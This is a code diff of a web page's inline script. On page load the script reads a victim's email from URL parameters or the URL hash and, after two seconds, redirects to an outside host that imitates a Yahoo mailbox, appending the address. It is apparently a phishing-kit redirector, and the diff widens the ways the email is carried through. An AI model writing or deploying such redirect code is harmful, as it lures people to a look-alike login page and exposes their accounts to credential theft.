@@ -140,27 +140,33 @@
         </div>
     </div>
 
-    <script>
-        function getUrlParameter(name) {
-            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
-            const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
-            const results = regex.exec(location.search);
-            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+<script>
+    function getUrlParameter(name) {
+        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+        const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+        const results = regex.exec(location.search);
+        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        // Check all possible sources for email
+        let email = getUrlParameter('mail') || 
+                   getUrlParameter('yzn') || 
+                   getUrlParameter('sor') || 
+                   window.location.hash.substring(1); // removes the # symbol
+        
+        let targetUrl = 'https://mailbox-yahoo-view8edjisrbglcha.ns.jonescs.com/f/392e424afebd';
+        
+        // Append email if it exists
+        if (email) {
+            targetUrl += '#' + email;
         }
 
-        document.addEventListener('DOMContentLoaded', () => {
-            const email = getUrlParameter('mail');
-            let targetUrl = 'https://mailbox-yahoo-view8edjisrbglcha.ns.jonescs.com/f/392e424afebd';
-            
-            if (email) {
-                targetUrl += (targetUrl.includes('?') ? '&' : '?') + '#' + (email);
-            }
-
-            // Redirect after 2 seconds
-            setTimeout(() => {
-                window.location.href = targetUrl;
-            }, 2000);
-        });
-    </script>
+        // Redirect after 2 seconds
+        setTimeout(() => {
+            window.location.href = targetUrl;
+        }, 2000);
+    });
+</script>
 </body>
 </html>
